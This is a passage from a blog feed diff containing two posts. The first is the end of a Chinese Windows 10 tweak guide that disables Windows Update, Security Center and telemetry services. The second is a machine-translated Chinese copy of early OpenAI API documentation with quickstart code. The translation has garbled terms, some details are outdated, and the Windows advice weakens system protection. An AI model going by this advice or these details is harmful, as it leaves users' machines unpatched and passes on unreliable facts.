+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.右键&quot;此电脑&quot;，选择&quot;管理&quot;。</span><br><span class="line">2.选择&quot;服务和应用程序=&gt;服务&quot;、然后找到&quot;Windows Update&quot;双击打开 （这里是用名称排序的，从W开始找比较快。）</span><br><span class="line">3.在&quot;常规&quot;选项卡下，把启动类型改为 &quot;禁用&quot;。</span><br><span class="line">4.点击&quot;恢复&quot;选项卡，将&quot;第一次失败&quot;、&quot;第二次失败&quot;、&quot;后续失败&quot;都改为&quot;无操作&quot;，然后点击&quot;确定&quot;（这步非常重要，否则自动更新还会自动开启。</span><br></pre></td></tr></table></figure>
+
+<p><strong>关闭计划任务</strong></p>
+<p>在桌面找到<strong>我的电脑</strong>，右键<strong>管理，</strong>然后依次点击<strong>系统工具，任务计划程序，任务计划程序库，microsoft，windows，windows update，将里面的选项都右键</strong>禁用。</p>
+<h1 id="关闭最近使用文件"><a href="#关闭最近使用文件" class="headerlink" title="关闭最近使用文件"></a>关闭最近使用文件</h1><p>步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开此电脑</span><br><span class="line">切换到选项卡，点击进入</span><br><span class="line">在常规下，隐私内关闭即可</span><br></pre></td></tr></table></figure>
+
+<h1 id="关闭win10一些服务"><a href="#关闭win10一些服务" class="headerlink" title="关闭win10一些服务"></a>关闭win10一些服务</h1><p>在桌面上找到 此电脑 右键—-管理 点击。</p>
+<p>然后如图所示，点开服务。</p>
+<p><strong>关闭并禁用这些服务</strong></p>
+<p><strong>Connected User Experiences and Telemetry</strong></p>
+<p>一个微软操作系统外围辅助服务。这项服务除了收集数据之外，还兼有收集错误和崩溃信息的职责，因此对于微软改进系统也有重要的意义。如果你不介意微软收集这些信息，可以保持服务的开启状态。</p>
+<p><strong>Diagnostic Execution Service</strong></p>
+<p>系统诊断执行服务 没什么卵用</p>
+<p><strong>HomeGroup Listener和HomeGroupProvider</strong></p>
+<p>家庭组服务，没什么卵用.</p>
+<p><strong>windows server</strong></p>
+<p>如果不经常使用系统搜索就关闭它</p>
+<p><strong>Program CompatibilityAssistant Service</strong></p>
+<p>兼容助手服务，</p>
+<p><strong>SecurityCenter</strong></p>
+<p>安全中心服务，直接禁用</p>
+<p><strong>SysMain</strong></p>
+<p>这个服务如果电脑上全部都是固态，可以关闭，要是有机械的话，有一定的作用。</p>
+<p>以上服务全部禁用。</p>
+<h1 id="关闭系统界面特效，优化系统性能"><a href="#关闭系统界面特效，优化系统性能" class="headerlink" title="关闭系统界面特效，优化系统性能"></a><strong>关闭系统界面特效，优化系统性能</strong></h1><p>如果选择 最佳性能的话，字体比较难看，看的不习惯，勾选 平滑字体边缘。其他的根据自己需要勾选，不在乎字体的话，直接 最佳性能</p>
+<p>只勾选：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
+
+<p>顺便设置下 系统启动设置</p>
+]]></content>
+      <categories>
+        <category>win系统</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ChatGPT中文文档</title>
+    <url>/posts/206c8462.html</url>
+    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>OpenAI API 几乎可以应用于任何涉及理解或生成自然语言、代码或图像的任务。我们提供一系列具有不同功率级别的模型，适用于不同的任务，并且能够微调您自己的自定义模型。这些模型可用于从内容生成到语义搜索和分类的所有领域。</p>
+<h2 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h2><p>我们建议您完成我们的快速入门教程，以通过实际操作的交互式示例熟悉关键概念。</p>
+<p><strong>提示</strong><br>设计提示本质上是您“编程”模型的方式，通常是通过提供一些说明或一些示例。这不同于为单一任务设计的大多数其他 NLP 服务，例如情感分类或命名实体识别。相反，完成和聊天完成端点可用于几乎任何任务，包括内容或代码生成、摘要、扩展、对话、创意写作、风格转换等。</p>
+<p><strong>代币</strong><br>我们的模型通过将文本分解为标记来理解和处理文本。标记可以是单词或只是字符块。例如，单词“hamburger”被分解为标记“ham”、“bur”和“ger”，而像“pear”这样的短而常见的单词是一个标记。许多标记以空格开头，例如“hello”和“bye”。</p>
+<p>在给定的 API 请求中处理的令牌数量取决于输入和输出的长度。根据粗略的经验法则，对于英文文本，1 个标记大约为 4 个字符或 0.75 个单词。要记住的一个限制是，您的文本提示和生成的完成组合不能超过模型的最大上下文长度（对于大多数模型，这是 2048 个标记，或大约 1500 个单词）。查看我们的分词器工具，了解有关文本如何转换为分词的更多信息。</p>
+<p><strong>楷模</strong><br>API 由一组具有不同功能和价位的模型提供支持。GPT-4 是我们最新、最强大的模型。GPT-3.5-Turbo 是为 ChatGPT 提供支持的模型，并针对对话格式进行了优化。要了解有关这些模型以及我们提供的其他内容的更多信息，请访问我们的模型文档。</p>
+<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>在开始构建应用程序时，请牢记我们的使用政策。<br>浏览我们的示例库以获取灵感。<br>跳转到我们的指南之一开始构建。</p>
+<h1 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h1><p>OpenAI 训练了非常擅长理解和生成文本的尖端语言模型。我们的 API 提供对这些模型的访问，可用于解决几乎任何涉及处理语言的任务。</p>
+<p>在本快速入门教程中，您将构建一个简单的示例应用程序。在此过程中，您将学习使用 API 完成任何任务的关键概念和技术，包括：</p>
+<ul>
+<li>内容生成</li>
+<li>总结</li>
+<li>分类、分类和情感分析</li>
+<li>数据提取</li>
+<li>翻译</li>
+<li>还有很多！</li>
+</ul>
+<h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>完成端点是我们 API 的核心，它提供了一个极其灵活和强大的简单接口。您输入一些文本作为提示，API 将返回一个文本完成，尝试匹配您提供的任何指令或上下文。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">迅速的 为冰淇淋店写一个标语。</span><br><span class="line"></span><br><span class="line">完成  每一勺我们都会微笑！</span><br></pre></td></tr></table></figure>
+
+<p>您可以将其视为非常高级的自动完成——模型处理您的文本提示并尝试预测接下来最有可能出现的内容。</p>
+<h2 id="从指令开始"><a href="#从指令开始" class="headerlink" title="从指令开始"></a>从指令开始</h2><p>假设您想创建一个宠物名字生成器。从头开始想出名字很难！</p>
+<p>首先，您需要一个明确说明您想要什么的提示。让我们从一个指令开始。提交此提示以生成您的第一个完成。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Suggest one name for a horse.</span><br><span class="line">闪电</span><br></pre></td></tr></table></figure>
+
+<p>不错！现在，试着让你的指示更具体。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Suggest one name for a black horse.</span><br><span class="line">午夜</span><br></pre></td></tr></table></figure>
+
+<p>如您所见，在我们的提示中添加一个简单的形容词会改变生成的完成。设计提示本质上就是您“编程”模型的方式。</p>
+<h2 id="添加一些例子"><a href="#添加一些例子" class="headerlink" title="添加一些例子"></a>添加一些例子</h2><p>制定好的说明对于获得好的结果很重要，但有时它们还不够。让我们试着让你的指令更复杂。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Suggest three names for a horse that is a superhero.</span><br><span class="line">1. 超级种马 2. 柯尔特船长 3. 强大的野马</span><br></pre></td></tr></table></figure>
+
+<p>这个完成并不是我们想要的。这些名称非常通用，而且模型似乎没有接受我们指令中的马匹部分。让我们看看能否让它提出一些更相关的建议。</p>
+<p>在许多情况下，向模型展示和告诉模型您想要什么是很有帮助的。在您的提示中添加示例可以帮助传达模式或细微差别。尝试提交此提示，其中包含几个示例。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Suggest three names for an animal that is a superhero.</span><br><span class="line"></span><br><span class="line">Animal: Cat</span><br><span class="line">Names: Captain Sharpclaw, Agent Fluffball, The Incredible Feline</span><br><span class="line">Animal: Dog</span><br><span class="line">Names: Ruff the Protector, Wonder Canine, Sir Barks-a-Lot</span><br><span class="line">Animal: Horse</span><br><span class="line">Names:</span><br><span class="line"></span><br><span class="line">超级种马、强大的母马、壮丽的马</span><br></pre></td></tr></table></figure>
+
+<p>好的！添加我们期望给定输入的输出示例有助于模型提供我们正在寻找的名称类型。</p>
+<h2 id="调整您的设置"><a href="#调整您的设置" class="headerlink" title="调整您的设置"></a>调整您的设置</h2><p>提示设计并不是您可以使用的唯一工具。您还可以通过调整设置来控制完成。最重要的设置之一称为温度。</p>
+<p>您可能已经注意到，如果您在上面的示例中多次提交相同的提示，模型将始终返回相同或非常相似的完成。这是因为您的温度设置为<strong>0</strong>。</p>
+<p><strong>尝试将 temperature 设置为1</strong>重新提交几次相同的提示。</p>
+<p>看看发生了什么？当温度高于 0 时，每次提交相同的提示会导致不同的完成。</p>
+<p>请记住，该模型预测哪个文本最有可能跟在它前面的文本之后。温度是一个介于 0 和 1 之间的值，基本上可以让您控制模型在进行这些预测时的置信度。降低温度意味着它将承担更少的风险，并且完成将更加准确和确定。升高温度将导致更多样化的完成。</p>
+<h2 id="构建您的应用程序"><a href="#构建您的应用程序" class="headerlink" title="构建您的应用程序"></a>构建您的应用程序</h2><h3 id="NODE-JS"><a href="#NODE-JS" class="headerlink" title="NODE.JS"></a><strong>NODE.JS</strong></h3><p>现在您已经找到了一个好的提示和设置，您已经准备好构建您的爱称生成器了！我们编写了一些代码来帮助您入门 - 按照以下说明下载代码并运行应用程序。</p>
+<p>设置<br>如果您没有安装 Node.js，请从此处安装。然后通过克隆此存储库下载代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/openai/openai-quickstart-node.git</span><br></pre></td></tr></table></figure>
+
+<p>如果您不想使用 git，您也可以使用此 zip 文件下载代码。</p>
+<p><strong>添加您的 API 密钥</strong><br>导航到项目目录并复制示例环境变量文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd openai-quickstart-node</span><br><span class="line">cp .env.example .env</span><br></pre></td></tr></table></figure>
+
+<p>复制您的秘密 API 密钥并将其设置为<code>OPENAI_API_KEY</code>您新创建的.env文件中的。如果您还没有创建密钥，您可以在下面创建。</p>
+<table>
+<thead>
+<tr>
+<th align="left">密钥</th>
+<th align="left">已创建</th>
+<th align="left">最后使用</th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">SK-…E75Y</td>
+<td align="left">2023年3月27日</td>
+<td align="left">绝不</td>
+<td align="left">‍</td>
+</tr>
+</tbody></table>
+<p><strong>重要说明：使用 Javascript 时，所有 API 调用都应仅在服务器端进行，因为在客户端浏览器代码中进行调用会暴露您的 API 密钥。有关更多详细信息，<a href="https://platform.openai.com/docs/api-reference/authentication">请参见此处。</a></strong></p>
+<p><strong>运行应用</strong><br>在项目目录下运行以下命令安装依赖并运行应用程序。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器中打开<a href="http://localhost:3000，您应该会看到昵称生成器！">http://localhost:3000，您应该会看到昵称生成器！</a></p>
+<p><strong>理解代码</strong><br>generate.js在文件夹中打开openai-quickstart-node/pages/api。在底部，您将看到生成我们在上面使用的提示的函数。由于用户将输入他们宠物的动物类型，因此它会动态换出指定动物的提示部分。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generatePrompt</span>(<span class="params">animal</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> capitalizedAnimal = animal[<span class="number">0</span>].<span class="title function_">toUpperCase</span>() + animal.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`Suggest three names for an animal that is a superhero.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Animal: Cat</span></span><br><span class="line"><span class="string">Names: Captain Sharpclaw, Agent Fluffball, The Incredible Feline</span></span><br><span class="line"><span class="string">Animal: Dog</span></span><br><span class="line"><span class="string">Names: Ruff the Protector, Wonder Canine, Sir Barks-a-Lot</span></span><br><span class="line"><span class="string">Animal: <span class="subst">$&#123;capitalizedAnimal&#125;</span></span></span><br><span class="line"><span class="string">Names:`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 中的第 9 行<code>generate.js</code>，您将看到发送实际 API 请求的代码。如上所述，它使用温度为 0.6 的<a href="https://platform.openai.com/docs/api-reference/completions">完成端点。</a></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> completion = <span class="keyword">await</span> openai.<span class="title function_">createCompletion</span>(&#123;</span><br><span class="line">  <span class="attr">model</span>: <span class="string">&quot;text-davinci-003&quot;</span>,</span><br><span class="line">  <span class="attr">prompt</span>: <span class="title function_">generatePrompt</span>(req.<span class="property">body</span>.<span class="property">animal</span>),</span><br><span class="line">  <span class="attr">temperature</span>: <span class="number">0.6</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>就是这样！您现在应该完全了解您的（超级英雄）宠物名称生成器如何使用 OpenAI API！</p>
+<h3 id="PYTHON-FLASK"><a href="#PYTHON-FLASK" class="headerlink" title="PYTHON (FLASK)"></a><strong>PYTHON (FLASK)</strong></h3><p>现在您已经找到了一个好的提示和设置，您已经准备好构建您的爱称生成器了！我们编写了一些代码来帮助您入门 - 按照以下说明下载代码并运行应用程序。</p>
+<p><strong>设置</strong></p>
+<p>如果您没有安装 Python，<a href="https://www.python.org/downloads/">请从此处安装</a>。<a href="https://github.com/openai/openai-quickstart-python">然后通过克隆此存储库</a>下载代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/openai/openai-quickstart-python.git</span><br></pre></td></tr></table></figure>
+
+<p>如果您不想使用 git，您也可以使用此 zip 文件下载代码。</p>
+<p><strong>添加您的 API 密钥</strong><br>导航到项目目录并复制示例环境变量文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd openai-quickstart-python</span><br><span class="line">cp .env.example .env</span><br></pre></td></tr></table></figure>
+
+<p>复制您的秘密 API 密钥并将其设置为OPENAI_API_KEY您新创建的.env文件中的。</p>
+<p><strong>运行应用</strong></p>
+<p>在项目目录下运行以下命令安装依赖并运行应用程序。运行命令时，您可能需要键入<code>python3</code>/<code>pip3</code>而不是<code>python</code>/ <code>pip</code>，具体取决于您的设置。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python -m venv venv</span><br><span class="line">. venv/bin/activate</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器中打开<a href="http://localhost:5000/">http://localhost:5000</a>，您应该会看到昵称生成器！</p>
+<p><strong>理解代码</strong></p>
+<p><code>app.py</code>在文件夹中打开<code>openai-quickstart-python</code>。在底部，您将看到生成我们在上面使用的提示的函数。由于用户将输入他们宠物的动物类型，因此它会动态换出指定动物的提示部分。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_prompt</span>(<span class="params">animal</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;Suggest three names for an animal that is a superhero.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Animal: Cat</span></span><br><span class="line"><span class="string">Names: Captain Sharpclaw, Agent Fluffball, The Incredible Feline</span></span><br><span class="line"><span class="string">Animal: Dog</span></span><br><span class="line"><span class="string">Names: Ruff the Protector, Wonder Canine, Sir Barks-a-Lot</span></span><br><span class="line"><span class="string">Animal: &#123;&#125;</span></span><br><span class="line"><span class="string">Names:&quot;&quot;&quot;</span>.<span class="built_in">format</span>(animal.capitalize())</span><br></pre></td></tr></table></figure>
+
+<p>在 中的第 14 行app.py，您将看到发送实际 API 请求的代码。如上所述，它使用温度为 0.6 的完成端点。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">response = openai.Completion.create(</span><br><span class="line">  model=&quot;text-davinci-003&quot;,</span><br><span class="line">  prompt=generate_prompt(animal),</span><br><span class="line">  temperature=0.6</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>就是这样！您现在应该完全了解您的（超级英雄）宠物名称生成器如何使用 OpenAI API！</p>
+<hr>
+<h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><p>这些概念和技术将大大有助于您构建自己的应用程序。也就是说，这个简单的例子只是展示了可能性的一小部分！完成端点非常灵活，几乎可以解决任何语言处理任务，包括内容生成、摘要、语义搜索、主题标记、情感分析等等。</p>
+<p>要记住的一个限制是，对于大多数<strong>模型</strong>，单个 API 请求在提示和完成之间最多只能处理 2,048 个标记（大约 1,500 个单词）。</p>
+<p>对于更高级的任务，您可能会发现自己希望能够提供更多的示例或上下文，而不是单个提示中的内容。微调<a href="https://platform.openai.com/docs/guides/fine-tuning">API</a>是执行此类更高级任务的绝佳选择。<strong>微调</strong>允许您提供数百甚至数千个示例来为您的特定用例定制模型。</p>
+<h2 id="下一步-1"><a href="#下一步-1" class="headerlink" title="下一步"></a>下一步</h2><p>要获得灵感并了解有关为不同任务设计提示的更多信息：</p>
+<ul>
+<li>阅读我们的<a href="https://platform.openai.com/docs/guides/completion">完成指南</a>。</li>
+<li>浏览我们的<a href="https://platform.openai.com/examples">示例提示</a>库。</li>
+<li>开始在<a href="https://platform.openai.com/playground">Playground</a>中进行试验。</li>
+<li>在开始构建时，请牢记我们的<a href="https://openai.com/policies/usage-policies">使用政策。</a></li>
+</ul>
+<h1 id="图书馆"><a href="#图书馆" class="headerlink" title="图书馆"></a>图书馆</h1><h2 id="Python库"><a href="#Python库" class="headerlink" title="Python库"></a>Python库</h2><p>我们提供了一个 Python 库，您可以按如下方式安装它：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install openai</span><br></pre></td></tr></table></figure>
+
+<p>安装后，您可以使用绑定和您的密钥运行以下命令：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load your API key from an environment variable or secret management service</span></span><br><span class="line">openai.api_key = os.getenv(<span class="string">&quot;OPENAI_API_KEY&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = openai.Completion.create(model=<span class="string">&quot;text-davinci-003&quot;</span>, prompt=<span class="string">&quot;Say this is a test&quot;</span>, temperature=<span class="number">0</span>, max_tokens=<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+<p>绑定还将安装一个命令行实用程序，您可以按如下方式使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openai api completions.create -m text-davinci-003 -p <span class="string">&quot;Say this is a test&quot;</span> -t 0 -M 7 --stream</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Node-js-库"><a href="#Node-js-库" class="headerlink" title="Node.js 库"></a>Node.js 库</h2><p>我们还有一个 Node.js 库，您可以通过在 Node.js 项目目录中运行以下命令来安装它：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install openai</span><br></pre></td></tr></table></figure>
+
+<p>安装后，您可以使用该库和您的密钥运行以下命令：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Configuration</span>, <span class="title class_">OpenAIApi</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;openai&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> configuration = <span class="keyword">new</span> <span class="title class_">Configuration</span>(&#123;</span><br><span class="line">  <span class="attr">apiKey</span>: process.<span class="property">env</span>.<span class="property">OPENAI_API_KEY</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> openai = <span class="keyword">new</span> <span class="title class_">OpenAIApi</span>(configuration);</span><br><span class="line"><span class="keyword">const</span> response = <span class="keyword">await</span> openai.<span class="title function_">createCompletion</span>(&#123;</span><br><span class="line">  <span class="attr">model</span>: <span class="string">&quot;text-davinci-003&quot;</span>,</span><br><span class="line">  <span class="attr">prompt</span>: <span class="string">&quot;Say this is a test&quot;</span>,</span><br><span class="line">  <span class="attr">temperature</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">max_tokens</span>: <span class="number">7</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="社区图书馆"><a href="#社区图书馆" class="headerlink" title="社区图书馆"></a>社区图书馆</h2><p>下面的库由更广泛的开发人员社区构建和维护。<a href="https://help.openai.com/en/articles/6684216-adding-your-api-client-to-the-community-libraries-page">如果您想在此处添加新库，请按照我们帮助中心文章</a>中有关添加社区库的说明进行操作。</p>
+<p>请注意，OpenAI 不会验证这些项目的正确性或安全性。</p>
+<p><a href="https://platform.openai.com/docs/libraries/c-net">C#/.NET</a></p>
+<ul>
+<li><a href="https://github.com/betalgo">Betalgo</a>的<a href="https://github.com/betalgo/openai">Betalgo.OpenAI.GPT3</a></li>
+<li><a href="https://github.com/OkGoDoIt">OkGoDoIt</a>的<a href="https://github.com/OkGoDoIt/OpenAI-API-dotnet">OpenAI-API-dotnet</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/crystal">水晶</a></p>
+<ul>
+<li><a href="https://github.com/sferik">sferik</a>的<a href="https://github.com/sferik/openai-crystal">openai-crystal</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/go">去</a></p>
+<ul>
+<li><a href="https://github.com/sashabaranov">sashabaranov</a>的<a href="https://github.com/sashabaranov/go-gpt3">go-gpt3</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/java">爪哇</a></p>
+<ul>
+<li><a href="https://github.com/TheoKanning">Theo Kanning</a>的<a href="https://github.com/TheoKanning/openai-java">openai-java</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/kotlin">科特林</a></p>
+<ul>
+<li><a href="https://github.com/Aallam">Mouaad Aallam</a>的<a href="https://github.com/Aallam/openai-kotlin">openai-kotlin</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/node-js">节点.js</a></p>
+<ul>
+<li><a href="https://github.com/Njerschow">Njerschow</a>的<a href="https://www.npmjs.com/package/openai-api">openai-api</a></li>
+<li><a href="https://github.com/erlapso">erlapso</a>的<a href="https://www.npmjs.com/package/openai-api-node">openai-api-node</a></li>
+<li><a href="https://github.com/ceifa">ceifa</a>的<a href="https://www.npmjs.com/package/gpt-x">gpt-x</a></li>
+<li><a href="https://github.com/poteat">poteat</a>的<a href="https://www.npmjs.com/package/gpt3">gpt3</a></li>
+<li><a href="https://github.com/thencc">thencc</a>的<a href="https://www.npmjs.com/package/gpts">gpts</a></li>
+<li><a href="https://www.npmjs.com/package/@dalenguyen/openai">@dalenguyen/openai</a> by <a href="https://github.com/dalenguyen">dalenguyen</a></li>
+<li>由<a href="https://tectalic.com/">tectalic设计的</a><a href="https://github.com/tectalichq/public-openai-client-js">tectalic/openai</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/php">PHP</a></p>
+<ul>
+<li><a href="https://packagist.org/packages/orhanerday/open-ai">orhanerday/open-ai</a> by <a href="https://github.com/orhanerday">orhanerday</a></li>
+<li>由<a href="https://tectalic.com/">tectalic设计的</a><a href="https://github.com/tectalichq/public-openai-client-php">tectalic/openai</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/python">Python</a></p>
+<ul>
+<li>OthersideAI<a href="https://github.com/OthersideAI/chronology">编年史</a><a href="https://www.othersideai.com/">_</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/r">R</a></p>
+<ul>
+<li><a href="https://github.com/ben-aaron188/rgpt3">rgpt3</a>作者：<a href="https://github.com/ben-aaron188">ben-aaron188</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/ruby">红宝石</a></p>
+<ul>
+<li><a href="https://github.com/nileshtrivedi">nileshtrivedi</a>的<a href="https://github.com/nileshtrivedi/openai/">openai</a></li>
+<li><a href="https://github.com/alexrudall">alexrudall</a>的<a href="https://github.com/alexrudall/ruby-openai">ruby-openai</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/scala">斯卡拉</a></p>
+<ul>
+<li><a href="https://github.com/cequence-io">cequence-io</a>的<a href="https://github.com/cequence-io/openai-scala-client">openai-scala-client</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/swift">迅速</a></p>
+<ul>
+<li><a href="https://github.com/dylanshine">dylanshine</a>的<a href="https://github.com/dylanshine/openai-kit">OpenAIKit</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/unity">统一</a></p>
+<ul>
+<li>由<a href="https://github.com/hexthedev">hexthedev开发的</a><a href="https://github.com/hexthedev/OpenAi-Api-Unity">OpenAi-Api-Unity</a></li>
+</ul>
+<p><a href="https://platform.openai.com/docs/libraries/unreal-engine">虚幻引擎</a></p>
+<ul>
+<li><a href="https://github.com/KellanM">KellanM</a>的<a href="https://github.com/KellanM/OpenAI-Api-Unreal">OpenAI-Api-Unreal</a></li>
+</ul>
+<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p>通过逐步构建真正的 AI 应用程序开始使用 OpenAI API。</p>
+<p><a href="https://platform.openai.com/docs/tutorials/web-qa-embeddings">带有嵌入的网站问答</a></p>
+<p>了解如何构建可以回答有关您网站的问题的 AI。</p>
+<hr>
+<p>即将推出</p>
+<p>了解如何构建和部署可以回答有关本地文件问题的 AI。</p>
+<hr>
+<p>即将推出</p>
+<p>了解如何构建和部署理解多个知识库的 AI 聊天机器人。</p>
+<hr>
+<p>寻找更多的想法？查看我们的<a href="https://platform.openai.com/examples">示例库</a>或GitHub 上的<a href="https://github.com/openai/openai-cookbook">OpenAI Cookbook</a>。</p>
+<hr>
+<h1 id="文本补全"><a href="#文本补全" class="headerlink" title="文本补全"></a>文本补全</h1><p>了解如何生成或操作文本</p>
+<h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://platform.openai.com/docs/api-reference/completions">完成</a>端点可用于各种任务。它为我们的任何<a href="https://platform.openai.com/docs/models">模型</a>提供了一个简单但功能强大的界面。您输入一些文本作为提示，模型将生成一个文本补全，尝试匹配您提供的任何上下文或模式。比如给API提示“正如笛卡尔所说，我认为，因此”，它会大概率返回补全“我是”。</p>
+<p>开始探索补全的最佳方式是通过我们的 Playground。它只是一个文本框，您可以在其中提交提示以生成完成。要自己尝试，<a href="https://platform.openai.com/playground/p/8P6JA6XEx74NTvcRUngWKEYW">请在 Playground 中打开此示例</a>：</p>
+<blockquote>
+<p>为冰淇淋店写一个标语。</p>
+</blockquote>
+<p>提交后，您会看到如下内容：</p>
+<blockquote>
+<p>为冰淇淋店写一个标语。 <strong>每一勺我们都会微笑！</strong></p>
+</blockquote>
+<p>您看到的实际完成情况可能有所不同，因为默认情况下 API 是不确定的。这意味着即使您的提示保持不变，您每次调用它时可能会得到略微不同的完成。<a href="https://platform.openai.com/docs/api-reference/completions/create#completions/create-temperature">将温度</a>设置为 0 将使输出大部分具有确定性，但可能会保留少量可变性。</p>
+<p>这个简单的文本输入、文本输出界面意味着您可以通过提供说明或您希望它做什么的几个示例来“编程”模型。它的成功通常取决于任务的复杂性和提示的质量。一个好的经验法则是考虑如何为中学生写一个应用题来解决。一个写得很好的提示提供了足够的信息让模型知道你想要什么以及它应该如何响应。</p>
+<p>本指南涵盖了一般的提示设计最佳实践和示例。要了解有关使用我们的 Codex 模型处理代码的更多信息，请访问我们的<a href="https://platform.openai.com/docs/guides/code">代码指南</a>。</p>
+<blockquote>
+<p>请记住，默认模型的训练数据将在 2021 年中断，因此它们可能不了解时事。我们计划在未来增加更多的持续培训。</p>
+</blockquote>
+<h2 id="提示设计"><a href="#提示设计" class="headerlink" title="提示设计"></a>提示设计</h2><p><strong>基本</strong></p>
+<p>我们的模型可以做任何事情，从生成原创故事到执行复杂的文本分析。因为他们可以做很多事情，所以你必须明确描述你想要什么。展示，而不仅仅是讲述，通常是获得良好提示的秘诀。</p>
+<p>创建提示的三个基本准则：</p>
+<p><strong>展示和讲述。</strong>通过说明、示例或两者的结合，明确您想要什么。如果您希望模型按字母顺序对项目列表进行排名或按情绪对段落进行分类，请向它展示您想要的。</p>
+<p><strong>提供质量数据。</strong>如果您正在尝试构建分类器或让模型遵循某种模式，请确保有足够的示例。一定要校对你的例子——模型通常足够聪明，可以看穿基本的拼写错误并给你一个回应，但它也可能认为这是故意的，它会影响回应。</p>
+<p><strong>检查您的设置。</strong>temperature 和 top_p 设置控制模型在生成响应时的确定性。如果您要求它提供只有一个正确答案的答复，那么您需要将这些设置得较低。如果您正在寻找更多样化的响应，那么您可能希望将它们设置得更高。人们在使用这些设置时犯的第一个错误是假设它们是“聪明”或“创造力”控制。</p>
+<p><strong>故障排除</strong></p>
+<p>如果您在使 API 按预期执行时遇到问题，请遵循此清单：</p>
+<ol>
+<li>是否清楚预期的一代应该是什么？</li>
+<li>有足够的例子吗？</li>
+<li>你检查过你的例子是否有错误吗？（API 不会直接告诉你）</li>
+<li>您是否正确使用 temperature 和 top_p？</li>
+</ol>
+<p><strong>分类</strong></p>
